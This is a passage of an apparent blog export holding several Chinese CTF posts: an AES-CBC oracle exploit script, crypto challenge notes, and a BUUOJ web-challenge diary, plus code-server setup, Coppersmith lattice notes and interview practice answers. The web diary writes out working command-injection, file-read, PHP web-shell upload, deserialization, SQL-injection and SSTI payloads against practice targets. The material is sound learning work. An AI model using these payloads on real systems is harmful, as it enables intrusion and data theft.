self.send(b&quot;forbid&quot;) continue self.send((iv+ret).hex().encode()) s = self.recv(b&quot;&gt;&gt; &quot;).decode() iv = bytes.fromhex(s[:32]) ans = bytes.fromhex(s[32:]) cipher = AES.new(key, AES.MODE_CBC, iv) att = cipher.decrypt(ans) att = unpad_x923(att) if att == chal.encode(): count += 1 self.send(b&quot;you got %d score&quot; % count) if count &gt;= 20: f=open(&quot;./flag&quot;,&quot;rb&quot;) FLAG=f.read() f.close() self.send(b&quot;cong!your flag is &quot;+FLAG) else: self.send(b&quot;sorry,plz try again&quot;) except: self.send(b&quot;something wrong! plz try again!&quot;) self.close()class ThreadedServer(socketserver.ThreadingMixIn, socketserver.TCPServer): passclass ForkedServer(socketserver.ForkingMixIn, socketserver.TCPServer): passif __name__ == &quot;__main__&quot;: HOST, PORT = '0.0.0.0', 12345 server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() mypad.py 如下： 1234from Crypto.Random import get_random_bytespad_x923=lambda x,block_size=16:x+get_random_bytes((block_size-(len(x)%block_size)-1))+bytes([(block_size-len(x)%block_size)])unpad_x923=lambda x,block_size=16:x[:-((x[-1]-1)%block_size)-1] 分析主要考点就是一个 CBC mode 的 AES，如何利用多次随机 IV 的 oracle 搞出一个能解密出 chal 的 IV 和 ciphertext，因为 key 是无法还原的。首先肯定是要逆出 chal，典型的 MT19937，注意到 getrandbits(128) 其实就是 4 个 getrandbits(32) 拼接出来的，题目给出的 IV 完全是满足 19968 bits 还原的条件，但是注意到 seed 是 8 字节随机数，也就是说不需要 624 个 getrandbits(32) 就可以还原出 seed，我用的是 272 个，也就是 68 个 getrandbits(128)，实际更少应该也行，但是不会有很明显的优化了，吧。然后很奇怪的一个点是 chal 虽然是 getrandbits(64*3)，按理说是 24 字节，但是出题人 hex 了一下，变成了 48 字节，这是一个蛮迷惑的操作，当时我找工作人员跟他确认的时候，他说这是故意做的字符空间压缩，实际上我觉得没鸟蛋区别，因为碰撞的过程中是完全随机的。 然后就是构造的部分，这个 AES 的 blocksize 是 16 字节，那么就是要构造 4 个 block，因为 pad 会多补一个 block，这个 block 的末字节的低 4 位是 0。注意到输入只给你输入 15 字节，所以构造的 block 只有前 15 字节是可控的，最后一个字节就要爆破，不做任何优化的情况下，第一个 block 可以直接改向量控制最后一个字节，第二、三个 block 都要爆 1/256，第四个 block 只需要爆 1/16，因为只需要令最后一个字节的低 4 位是 0。 exp基本是稳定 30 分的，题目说的什么一次不行再来两次的，根本不需要好吧（除非你大非酋非到没边了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173from pwn import *from Crypto.Util.number import *from tqdm import trange, tqdmfrom Crypto.Random import get_random_bytesfrom seedrecovery import MT19937RecoverSeedimport randomimport itertools as itsimport stringfrom hashlib import sha256pad_x923=lambda x,block_size=16:x+get_random_bytes((block_size-(len(x)%block_size)-1))+bytes([(block_size-len(x)%block_size)])unpad_x923=lambda x,block_size=16:x[:-((x[-1]-1)%block_size)-1]r = remote('127.0.0.1', 12345)# context.log_level = 'debug'def proof_of_work(suffix, hash, prelen=4): table = string.ascii_letters+string.digits r = its.product(table, repeat=prelen) for i in tqdm(r): i = ''.join(i) str = i + suffix str_256 = sha256(str.encode()).hexdigest() if str_256 == hash: return i raise Exception('Not Found')def iv2num(iv: bytes): nums = [] iv = bytes_to_long(iv) for _ in range(4): nums.append(iv % 2**32) iv &gt;&gt;= 32 return numsdef oracle(p: bytes): r.sendlineafter(b&quot;:&gt; &quot;, p) res = r.recvline().strip().decode() iv = bytes.fromhex(res)[:16] ciphertext = bytes.fromhex(res)[16:] return iv, ciphertextprefix = r.recvuntil(b')').decode()[-17:-1]h = r.recvline().decode()[4:-1]r.recvuntil(b'[+] Plz tell me XXXX: ')r.sendline(proof_of_work(prefix, h, 4).encode())win = 0for _ in trange(50): data = [] for _ in range(68): iv, _ = oracle(b'00') data += iv2num(iv) assert len(data) == 272 recover = MT19937RecoverSeed([0]*6 + data, 8) seed = recover.get_seed() random.seed(seed) # chal = long_to_bytes(random.getrandbits(64*3)) chal = hex(random.getrandbits(64*3))[2:].zfill(16*3).encode() iv_list = [long_to_bytes(random.getrandbits(128)).rjust(16, b&quot;\\00&quot;) for _ in range(200)] TRY_TABLE_LEN = 16 ivs = [] for _ in range(TRY_TABLE_LEN): iv, enc = oracle(chal[:15].hex().encode()) ivs.append((200, iv, enc)) # now find the iv and enc for i in range(TRY_TABLE_LEN): _, iv, enc = ivs[i] for j in range(68 + TRY_TABLE_LEN, 180): iv2 = iv_list[j] check = list(iv2)[-1] ^ list(enc)[-1] ^ 1 == chal[31] if check: # success(j) ivs[i] = (j, iv, enc) break ivs = [i for i in ivs if i[0] != 200] ivs.sort(key=lambda x: x[0]) # info(ivs) info(&quot;%d possble ivs found&quot; % len(ivs)) count = 68 + TRY_TABLE_LEN while True: iv3_found = False if count &gt; 199: warn(&quot;GG&quot;) break result = next((iv for iv in ivs if iv[0] == count), None) if result is None: oracle(b'00') count += 1 continue else: iv, enc = result[1], result[2] iv2 = iv_list[count] payload = bytes_to_long(chal[16:32]) ^ bytes_to_long(iv2) ^ bytes_to_long(enc) payload = long_to_bytes(payload) payload = payload[:15] iv2_true, enc2 = oracle(payload.hex().encode()) assert iv2_true == iv2, (iv2_true, iv2) for i in range(count, 190): iv3 = iv_list[i] check = list(iv3)[-1] ^ list(enc2)[-1] ^ 1 == chal[47] if check: iv3_found = True break count += 1 if iv3_found: success(&quot;BLOCK1 PASS AT %d&quot; % count) break else: continue # info(count) while True: if count &gt; 199: warn(&quot;GG&quot;) enc3 = b'\\x00'*16 break iv3 = iv_list[count] count += 1 payload = bytes_to_long(chal[32:48]) ^ bytes_to_long(iv3) ^ bytes_to_long(enc2) payload = long_to_bytes(payload) payload = payload[:15] iv3_true, enc3 = oracle(payload.hex().encode()) check = list(iv3)[-1] ^ list(enc2)[-1] ^ 1 == chal[47] if check: success(&quot;BLOCK2 PASS AT %d&quot; % count) break else: continue while True: if count &gt; 199: warn(&quot;GG&quot;) enc4 = b'\\x00'*16 break iv4 = iv_list[count] count += 1 payload = bytes_to_long(b'\\x00') ^ bytes_to_long(iv4) ^ bytes_to_long(enc3) payload = long_to_bytes(payload) payload = payload[:15] iv4_true, enc4 = oracle(payload.hex().encode()) check = (list(iv4)[-1] ^ list(enc3)[-1] ^ 1) &amp; 0xf == 0 if check: success(&quot;BLOCK3 PASS AT %d OHHHHHHHH!!!!!!!&quot; % count) win += 1 break else: continue info(&quot;Win times: (%d / 20)&quot; % win) for _ in range(200 - count): oracle(b'00') iv = list(iv) iv[-1] = iv[-1] ^ 1 ^ chal[15] iv = bytes(iv) payload2 = iv + enc + enc2 + enc3 + enc4 r.sendlineafter(b&quot;&gt;&gt; &quot;, payload2.hex().encode())r.interactive()","link":"/2024/11/29/2024%20%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%86%B3%E8%B5%9B%20Crypto/"},{"title":"2025 CISCN &amp; CCB - Crypto","text":"四个一血，那就是四血，四血就是没血，没血就是菜鸡，所以我是菜鸡 rasnd签到 1234567891011121314151617181920212223242526272829303132333435363738394041from Crypto.Util.number import getPrime, bytes_to_longfrom random import randintimport osFLAG = os.getenv(&quot;FLAG&quot;).encode()flag1 = FLAG[:15]flag2 = FLAG[15:]def crypto1(): p = getPrime(1024) q = getPrime(1024) n = p * q e = 0x10001 x1=randint(0,2**11) y1=randint(0,2**114) x2=randint(0,2**11) y2=randint(0,2**514) hint1=x1*p+y1*q-0x114 hint2=x2*p+y2*q-0x514 c = pow(bytes_to_long(flag1), e, n) print(n) print(c) print(hint1) print(hint2)def crypto2(): p = getPrime(1024) q = getPrime(1024) n = p * q e = 0x10001 hint = pow(514*p - 114*q, n - p - q, n) c = pow(bytes_to_long(flag2),e,n) print(n) print(c) print(hint)print(&quot;==================================================================&quot;)crypto1()print(&quot;==================================================================&quot;)crypto2()print(&quot;==================================================================&quot;) Par1 给了$$h_1 = x_1p + y_1q \\\\h_2 = x_2p + y_2q$$ 这里后面硬塞的 0x114 和 0x514 默认加回去了因为 $x_1$ 和 $x_2$ 比较小，所以可以直接爆出来，然后 $x_2h_1 - x_1h_2$ 就能把 $p$ 消掉，只剩下 $q$ 的倍数，跟 $n$ 做一下 GCD 就分解出来了。 Part2 给了$$h = (514p - 114q)^{n - p - q} \\pmod n$$ 注意到 $n - p - q = \\varphi(n) - 1$，所以 $h$ 就是 $514p - 114q$ 的逆元，这个时候代入 $q = n/p$ 就能化成一个关于 $p$ 的一元二次方程，用通解解出来就行了。好像看到某支大神队伍用结式搞，有点杀鸡用牛刀了。 fffffhash原DownUnderCTF2023 fnv有空再来分析今年的国赛也出了一道 FNV，但是是明确是 7 个字节的，所以可以直接 MITM，也就是中间相遇搞出来。 LWEWL双原合一Dicectf2023 membraneNSSCTF Round18 New Year Ring3也是有空再来分析 babypqc极简非预期第一次输入 0第二次输入 []你就有 1/16 的概率拿到 flag 正经解法首先是打一个 MT19937，题目给的随机数加起来刚好是 19968 bit 的，所以需要利用 N （一个 list）把 p q 分解出来，这部分可以用 AGCD 搞出来。搞到这 m 就还原出来了，塞给他签名，就拿到了一个正确的签名，再交回去，answers 就是 1，num 是 0-15 的随机数，赌他随出 1 就行。也就是这时候我发现随出 0 也行，也就是上面的极简非预期解法。。。无语了打出 MT19937 后 tmp 就全知道了，$s_1$ 由于是只有 512 个非零元素，所以可以直接 solve_right 解出来，但是 $s_2$ 是满的，应该要用格搞一搞。 作业没写完，有空再来补。","link":"/2024/12/17/2025%20CISCN%20&%20CCB%20-%20Crypto/"},{"title":"BUUOJ 之 Web 刷题记","text":"这学期好像没什么课，就想着学一下 Web ，于是就去 BUUOJ 上刷题了。（copilot 挺懂我） 前言其实一开始学 CTF 的时候就想做 Web 了，但是当时密码手快毕业了，密码也简单好学，就先学密码了。现在密码也学了个半桶水，得着手全栈了。 刷题[GXYCTF2019]Ping Ping Ping题目给出一个 ?ip=，显然是让我用 GET 方法传参，随便传个 1 返回的是 ping 的结果，看来是命令执行，我习惯性后面补个 &amp;&amp;ls，结果没反应，一看 wp 原来还能用分号的，&amp;&amp; 要上一条命令执行成功才会执行下一条，而 ; 则是不管上一条命令是否成功都会执行下一条，所以这里用 ; 就行了。 然后难点在于正则过滤，index.php 内容如下： 12345678910111213141516171819202122/?ip=&lt;pre&gt;PING 1 (0.0.0.1): 56 data bytes/?ip=&lt;?phpif(isset($_GET['ip'])){ $ip = $_GET['ip']; if(preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x{00}-\\x{1f}]|\\&gt;|\\'|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/&quot;, $ip, $match)){ echo preg_match(&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x{00}-\\x{20}]|\\&gt;|\\'|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\{|\\}/&quot;, $ip, $match); die(&quot;fxck your symbol!&quot;); } else if(preg_match(&quot;/ /&quot;, $ip)){ die(&quot;fxck your space!&quot;); } else if(preg_match(&quot;/bash/&quot;, $ip)){ die(&quot;fxck your bash!&quot;); } else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){ die(&quot;fxck your flag!&quot;); } $a = shell_exec(&quot;ping -c 4 &quot;.$ip); echo &quot;&lt;pre&gt;&quot;; print_r($a);}?&gt; 这里过滤了空格和 flag，所以不能直接 cat flag.php，wp 的 payload 是 1?ip=127.0.0.1;cat$IFS$1`ls` $IFS 是空格，$1 是第一个参数，所以这里就是 cat flag.php index.php，然后就能看到 flag 了。注意这里的 $1 会带出 ls 的所有结果而不仅仅是 flag.php。所以 cat 出来的是目录下所有文件。 解法二是 echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh，这里的 Y2F0IGZsYWcucGhw 是 cat flag.php 的 base64 编码，-d 是解码，然后传到 sh 执行。注意到 index.php 只过滤了 bash，所以这里可以用 sh。 [强网杯 2019]随便注最头疼的就是这些注入了，没学过 sql 语句，也没学过数据库。 随便填个 1 提交后返回 123456array(2) { [0]=&gt; string(1) &quot;1&quot; [1]=&gt; string(7) &quot;hahahah&quot;} 从网上抄的 1' or '1'='1 不管用，有空再回来补。 [SUCTF 2019]EasySQL抄的 wp：*,1，也不懂，有空补。 [极客大挑战 2019]Secret FileF12 看到 1&lt;a id=&quot;master&quot; href=&quot;./Archive_room.php&quot; style=&quot;background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;&quot;&gt;Oh! You found me&lt;/a&gt; 转到 Archive_room.php，有一个按钮指向 action.php，点了之后是一个 302 后的 end.php。应该是跳到 action.php 然后光速重定向到 end.php，所以没看到 action.php 的内容。用 burpsuite 抓包，发现 action.php 有个 secr3t.php，进去后是以下代码 123456789101112131415&lt;html&gt; &lt;title&gt;secret&lt;/title&gt; &lt;meta charset=&quot;UTF-8&quot;&gt;&lt;?php highlight_file(__FILE__); error_reporting(0); $file=$_GET['file']; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;)){ echo &quot;Oh no!&quot;; exit(); } include($file); //flag放在了flag.php里?&gt;&lt;/html&gt; 这时候要用 php 伪协议读取 flag.php，php://filter 是 php 伪协议，read=convert.base64-encode/resource= 是 base64 编码，flag.php 是要读取的文件，所以这里的 payload 是 secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php，然后把返回的 base64 解码就行了。 [极客大挑战 2019]Http找到藏着的标签 1&lt;a style=&quot;border:none;cursor:default;&quot; onclick=&quot;return false&quot; href=&quot;Secret.php&quot;&gt;氛围&lt;/a&gt; 转到 Secret.php，按他提示依次改 Referer, User-Agent 和 X-Forwarded-For，然后就能看到 flag 了。改完后如下： 12345678910GET /Secret.php HTTP/1.1Host: node4.buuoj.cn:25539Upgrade-Insecure-Requests: 1User-Agent: &quot;Syclover&quot; browserAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeReferer: https://Sycsecret.buuoj.cnX-Forwarded-For: localhost [极客大挑战 2019]Knife蚁剑连上秒了。 [极客大挑战 2019]Upload考文件上传，只能上传图片，还过滤了 &lt;?，新建一个文件写如下内容： 1GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST['a'])&lt;/script&gt; 然后后缀改成 .jpg，上传成功，然后在 burpsuite 把后缀改成 .phtml 重发一遍，文件存在了 /upload 文件夹，用蚁剑连上去就行了。或者上传 .phtml先，这时上传是失败的的，bp 抓包把 Content-Type 改成 image/jpeg 重发一遍就行了。 [ACTF2020 新生赛]Upload和上面的差不多，前端验证后缀，上传个 .jpg 然后 bp 改下后缀重发就行。 [极客大挑战 2019]BabySQL又是 SQL 注入，跳过。 [极客大挑战 2019]PHP盲猜有个 www.zip，下载下来看到 unserialize，反序列化的题。 123456789101112131415161718192021222324252627282930313233&lt;?phpinclude 'flag.php';error_reporting(0);class Name{ private $username = 'nonono'; private $password = 'yesyes'; public function __construct($username,$password){ $this-&gt;username = $username; $this-&gt;password = $password; } function __wakeup(){ $this-&gt;username = 'guest'; } function __destruct(){ if ($this-&gt;password != 100) { echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;; echo &quot;You name is: &quot;; echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;; echo &quot;You password is: &quot;; echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;; die(); } if ($this-&gt;username === 'admin') { global $flag; echo $flag; }else{ echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!&quot;; die(); } }}?&gt; 反序列化时会首先执行 __wakeup，然后执行 __destruct，但是 __wakeup 里把 username 改成了 guest，所以 __destruct 里的 if ($this-&gt;username === 'admin') 正常情况下永远不会成立，所以这里要绕过 __wakeup，在反序列化时，当前属性个数大于实际属性个数时，就会跳过 __wakeup，但是这个似乎是 PHP 低版本的漏洞，用高版本的 PHP 复现不出来。 1234567891011121314&lt;?phpclass Name{ private $username = 'nonono'; private $password = 'yesyes'; public function __construct($username,$password){ $this-&gt;username = $username; $this-&gt;password = $password; }}$a = new Name('admin', 100);$b = urlencode(serialize($a));echo $b; ?&gt; 出来一个 O%3A4%3A%22Name%22%3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D，urlencode 前是 O:4:&quot;Name&quot;:2:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;}，所以把 2 改成 3 就行，最终的 payload 就是 ?select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;} [ACTF2020 新生赛]BackupFilewp 说用 dirsearch 嗯扫，我一通操作发现鸟蛋没扫出来，一看原来已经报 429 Too Many Requests，这 dirsearch 也是个笨比不知道歇会再扫。总之就是有个 index.php.bak，内容如下： 1234567891011121314151617&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET['key'])) { $key = $_GET['key']; if(!is_numeric($key)) { exit(&quot;Just num!&quot;); } $key = intval($key); $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;; if($key == $str) { echo $flag; }}else { echo &quot;Try to find out source file!&quot;;} php 里的 == 不要求类型相同，数字和混合字符串比较时，取最前面的一串数字，这里的 str 就只取 123，所以这里的 payload 是 ?key=123。 [RoarCTF 2019]Easy CalcF12 看到说 I've set up WAF to ensure security.，WAF 是 Web Application Firewall 的缩写，就是一种防火墙。然后看到计算的过程是用 AJAX 发个包给 calc.php 去。直接访问 calc.php，内容如下： 123456789101112131415&lt;?phperror_reporting(0);if(!isset($_GET['num'])){ show_source(__FILE__);}else{ $str = $_GET['num']; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '&quot;', '`', '\\[', '\\]','\\$','\\\\','\\^']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $str)) { die(&quot;what are you want to do?&quot;); } } eval('echo '.$str.';');}?&gt; 然后发现 num 里面有字母时也会被 WAF 拦下来，比如 ?num=a 时就不行，这时候就有个骚操作，可以在 num 前面加个空格或者 +，这样就能绕过 WAF 了，但是 PHP 在解析参数的时候会把空格或者 + 去掉。那么我们 ? num=var_dump(scandir(chr(47))) 看下目录内容，为了绕过黑名单只能用 ASCII码，chr(47) 就是 /，也就是相当于 ls /，看到有个 f1agg，用 file_get_contents 读出来就行，payload 为 ? num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))。 [极客大挑战 2019]BuyFlagMENU 跳到 pay.php，F12 看到源码： 12345678if (isset($_POST['password'])) { $password = $_POST['password']; if (is_numeric($password)) { echo &quot;password can't be number&lt;/br&gt;&quot;; }elseif ($password == 404) { echo &quot;Password Right!&lt;/br&gt;&quot;; }} 又要 password 不是数字，又要 password 是 404，那还是 PHP 的弱类型比较，搞个 404a 传过去，发现没反应，根据他的要求再 POST 个 money 过去，还是没反应，看 wp 才发现有个 user 的 cookie 要改成 1，这时有反应了，说 money 太长。PHP 5.3 有个关于 strcmp 的漏洞，就是数据类型不同的时候，strcmp 会返回 0，所以这里的 payload 是 ?password=404a&amp;money[]=1，就是把 money 干成数组，就得到 flag了。 [BJDCTF2020]Easy MD5随便输个 1，一看响应头有个 hint：Hint: select * from 'admin' where password=md5($pass,true)，好，那就搞搞 MD5。首先 MD5 出来的是一个 128 位的散列值，然后 PHP 的 md5 函数后面的 true 是指返回二进制格式的散列值，但是这个二进制串会进行 ASCII 码转换成字符串，类似 python 里的 str(long_to_bytes())。wp 中选择了 ffifdyop 作为 payload，其 MD5 值为 276f722736c95d99e921722cf9ed621c，前面的 27 6f 72 27 36 对应的字符为 'or'6，这样就可以进行一个 SQL 注入，拼凑出 select * from 'admin' where password=''or'6...'，后面还会跟着一堆乱码，但是 6... 会被当成数字，所以就一定为真。然后跳到了 levels91.php，F12 看到： 12345$a = $GET['a'];$b = $_GET['b'];if($a != $b &amp;&amp; md5($a) == md5($b)){ // wow, glzjin wants a girl friend. $GET 感觉是错的，真随意。后面的 if 语句有两种方法绕过，一种是找到两个不同的字符串，其 MD5 值都是 0e 后面跟数字，这样的话 PHP 会当成是科学计数法，其值都为 0，比如 QNKCDZO 和 s878926199a，传参进去后出现如下代码： 123456789&lt;?phperror_reporting(0);include &quot;flag.php&quot;;highlight_file(__FILE__);if($_POST['param1']!==$_POST['param2']&amp;&amp;md5($_POST['param1'])===md5($_POST['param2'])){ echo $flag;} 这里就要用第二种方法了，就是传俩数组进去，md5 函数会返回 null，然后 null 和 null 比较时会返回 true，而且这个方法刚才也能用，即弱比较和强比较通杀。 [护网杯 2018]easy_tornado打开一看是个目录，有 /flag.txt，/welcome.txt 和 hints.txt，内容分别为 flag in /fllllllllllllag，render 和 md5(cookie_secret+md5(filename)) 打开文件的时候 url 变成了 /file?filename=/xxx.txt&amp;filehash=xxx，那我想看 flag 的话应该得搞到 flag 文件的 filehash，那首先得搞到 cookie_secret。题目名字中的 tornado 是一个 Python 的 web 框架，类似 Flask，那么题目是 SSTI 注入，即 Server-Side Template Injection，服务端模板注入。先只传 filename 不传 filehash，他就急了，网页跳转到 /error?msg=Error，网页内容也是 Error，那么考虑对 msg 进行注入。小插曲：这时候太困睡觉去了，第二天再来搞这题时 BUU 在维护了，开摆！msg={{1}} 的时候回显 1 了，有说法，wp 说 cookie_secret 在 handler.settings，这时候 /error?msg={{handler.settings}} 返回了一串 json，其中确实有我们要找的 cookie_secret。在传 filehash 的时候一开始只拿 fllllllllllllag 去算了，结果不对，还得加上 /。","link":"/2023/09/14/BUUOJ%20%E4%B9%8B%20Web%20%E5%88%B7%E9%A2%98%E8%AE%B0/"},{"title":"Code-server 配置","text":"在 Windows 上使用 WSL ，在 WSL 上使用 VSCode ，在 VSCode 上使用 Code-server。 Code-server 感觉不错，免去我远程桌面的麻烦。 安装 下载 Code-serverhttps://github.com/coder/code-server/releases/tag/v4.2.0 解压 tar -xvzf code-server.tar.gz cd 进解压后的目录，./code-server /home /home 可以替换成你想要的目录(这步不要在 VSCode 的终端执行) 配置找到 ~/.config/code-server/config.yaml ， bind-addr 项可以改你想要的端口，如 127.0.0.1：8080 ， password 项可以改密码。然后用 Nginx 代理出去就能在局域网上访问了。 ref:https://www.cnblogs.com/billyme/p/13769847.htmlhttps://blog.csdn.net/mijichui2153/article/details/18880283","link":"/2022/03/30/Code-server%20%E9%85%8D%E7%BD%AE/"},{"title":"Coppersmith","text":"研究一些多元 Coppersmith 前言不知不觉学密码有半年了，从最开始的 RSA 到格再到奇奇怪怪的东西，不禁感慨数学确实有趣。之前的 MRCTF 的题有道三元 Coppersmith ，可惜当时水平太过低微，既做不出来也看不懂 exp ，如今再回来补这个坑，就差不多可以往生 pwn 了。 后记这篇文章搁了很久，pwn 由于一些原因也没怎么做，还是在密码里打点小工。刚好天枢的 CTF 有一道 Coppersmith，吃了没基础的亏，论文都看不懂。 Coppersmith 的大致思想可以参考 Tover 爷的这篇文章。 模根与整根RSA 的许多攻击都可以化成解模根的问题，而所谓解模根就是方程在模数 $N$ 下的解。这时候直接解是不现实的，就需要用到 Coppersmith 方法。解模根的关键就是 Howgrave-Graham 定理：令 $h(x_1,…,x_n) \\in Z[x_1,…,x_n]$ 为一个至多含 $\\omega$ 个单项式的整数多项式，若满足$$h(x_1^{(0)},…,x_n^{(0)}) \\equiv 0 \\mod N^m \\enspace for\\enspace some\\enspace |x_1^{(0)}| &lt; X_1,\\dots,|x_n^{(0)}| &lt; X_n ,\\enspace and \\\\||h(x_1X_1,\\dots,x_nX_n)|| &lt; \\frac{N^m}{\\sqrt{\\omega}}$$则 $h(x_1^{(0)},…,x_n^{(0)}) = 0$ 在整数域上成立。 不难看出，这个定理实际是将模方程转化成我们所常见的整数方程，这样，我们就可以用一些常见的方法（如牛顿迭代法）来求解了。 如 GF(323) 上的方程$$F(x) = x^2 + 33x + 215 \\equiv 0 \\pmod{323}$$由韦达定理就能看出，这个方程在整数域下是解不出来实根的，但是我们稍微变换一下，变为如下形式，记 $M = 323$$$G(x) = 9F(x) - M(x+6) = 9x^2 - 26x - 3$$注意，$G(x) \\equiv 0 \\pmod{M}$ 仍是成立的。但是这个时候，肉眼分解 $G(x) = (x-3)(9x+1)$ 就能得到根 $x_0=3$，而这个根代入原始方程也是成立的。 Coppersmith 就是利用这个思想，往方程加入一些模 $M$ 为零的项，使得方程满足 Howgrave-Graham 定理的条件，然后再用整数域的方法求解。 单变量 Coppersmith 的实现一个比较基础是方法是构造一个简单的矩阵跑 LLL。直接上例子： $$F(x) = x^3 + 10x^2 + 5000x − 222$$ 我们可以构造矩阵 $$B=\\begin{pmatrix}M &amp; 0 &amp; 0 &amp; 0 \\\\0 &amp; MX &amp; 0 &amp; 0 \\\\0 &amp; 0 &amp; MX^2 &amp; 0 \\\\-222 &amp; 5000X &amp; 10X^2 &amp; X^3\\end{pmatrix}$$ 可以理解成 LLL 的过程中用前面三行对最后一行进行了一些加减操作，使得最后一行的系数变得很小，而实际上系数变小就是为了满足 Howgrave-Graham 定理的界。 LLL 后我们得到向量 $(444, 10, −2000, −2000)$，对应的多项式为 $G(x) = 444+x-20x^2-2x^3$，这个多项式在整数域上的根 $x_0=4$ 即为原方程的根。 然而以上的方法需要满足 $M^dX^{d(d+1)/2} =\\det(L) &lt; M^{d+1}$，更精确来说是 $2^{d/4}M^{d/(d+1)}X^{d/2} &lt; M/\\sqrt{d + 1}$（证明不难，即 LLL 得到的最短向量小于 HG 定理的界），可以看出 $X$ 越小这个条件越容易满足，但是我们的研究通常是把 $X$ 的界往上扩的，这时我们就可以加一些 x-shift 的多项式(关于这个词，总感觉翻译成 x 的移位多项式比较怪，本文就保留原英文称谓了)。 如果你细心去算了，就会发现上面的例子其实是不符合条件的，因为 LLL 给出的是最坏的界，我们算条件也是用这个最坏的界，上面恰好得到了一个更好（即更短）的向量。 感觉这篇文又要鸽了，没看懂他例子的格是怎么造出来的。 二元 Coppersmith结式三元 Coppersmith参数解释论文里 $X,Y$ 和 $Z$ 不难理解是三个变量对应的界，但除此之外还有 $W,\\tau$ 和 $m$ 的选取，这也是我当前很迷糊的点，下面简单探讨一下。 首先是最简单的 $W$ ，论文明确给出 $W=||f(x_1X_n,\\dots,x_nX_n)||_\\infty$ ，而 $||f(x_1,\\dots,x_n)||_{\\infty}$ 的意思就是多项式的最大系数，所以 $W$ 就是多项式对各 $x$ 进行 $Xx$ 代入后的最大系数。如 $f=2x^2+3x+4$ ， $X=2$ ，则 $||f(x_1X_n,\\dots,x_nX_n)||=8x^2+6x+4$ ，显然最大系数在 $x^2$ 那，即 $W=8$ 。然后 $\\tau$ 和 $m$ 目前我也不知道咋算（） 杂谈直到现在才反应过来 paper 的引用名中后面的数字是年份（） 参考 知乎 -「:=」和「=:」的区别是什么？ Santanu Sarkar and Subhamoy Maitra. Some Applications of Lattice Based Root Finding Techniques [ELL06] E. Jochemsz and A. May. A strategy for finding roots of multivariate polynomials with new applications in attacking RSA variants, Asiacrypt 2006, LNCS 4284, pp. 267–282, 2006. Coppersmith’s Method and Related Applications lord. Way to CopperSmith","link":"/2022/10/15/Coppersmith/"},{"title":"GPT 面试官","text":"提前拷打自己。 Day 1 请描述 malloc 和 free 的内部工作机制以及可能导致的内存泄漏问题。 不会。 GPT：malloc 是用来在堆上分配内存的函数，它会找到一块足够大的空闲内存块，然后标记为已使用并返回该内存块的指针。free 用来释放之前用 malloc 分配的内存，它将内存块标记为未使用，以便后续分配。内存泄漏问题是由于程序员忘记释放不再使用的内存，导致可用内存逐渐减少，最终可能耗尽内存资源 在 Python 中，如何处理多线程与多进程？它们之间有何区别？ 不会。 GPT：在 Python 中，多线程可以使用 threading 模块，多进程可以使用 multiprocessing 模块。多线程适用于 I/O 密集型任务，而多进程适用于 CPU 密集型任务。主要区别在于多线程共享相同的内存空间，线程间通信开销较小，但由于 GIL（全局解释器锁）的存在，无法充分利用多核 CPU。而多进程每个进程有独立的内存空间，能够绕过 GIL，更好地利用多核 CPU，但进程间通信开销较大。 解释一下 Python 中的 GIL（全局解释器锁）是什么，以及它对多线程编程的影响。 不会。 GIL 是 Python 解释器用来保护访问 Python 对象的全局锁，确保同一时刻只有一个线程执行 Python 字节码。它的存在使得 Python 多线程在 CPU 密集型任务中无法提高执行效率，因为即使在多核处理器上，也只能有一个线程执行 Python 代码。这限制了 Python 在多线程 CPU 密集型任务中的并行执行能力。 在 Golang 中，如何进行并发编程？请举例说明。 通过 goroutine。 GPT：在 Golang 中，并发编程通过 goroutine 实现。goroutine 是轻量级线程，通过 go 关键字启动。示例代码： 123456789101112131415161718package mainimport ( &quot;fmt&quot; &quot;time&quot;)func say(s string) { for i := 0; i &lt; 5; i++ { time.Sleep(100 * time.Millisecond) fmt.Println(s) }}func main() { go say(&quot;world&quot;) say(&quot;hello&quot;)} 上述代码中，say(&quot;world&quot;) 通过 goroutine 并发执行。 请解释 x86 汇编中栈指针（ESP）和基址指针（EBP）的作用及其在函数调用中的使用。 ESP 指向当前栈顶，基址指针指向栈底，函数调用时，把 EBP 压栈，再把 ESP 传到 EBP，ESP 指向新的地址。 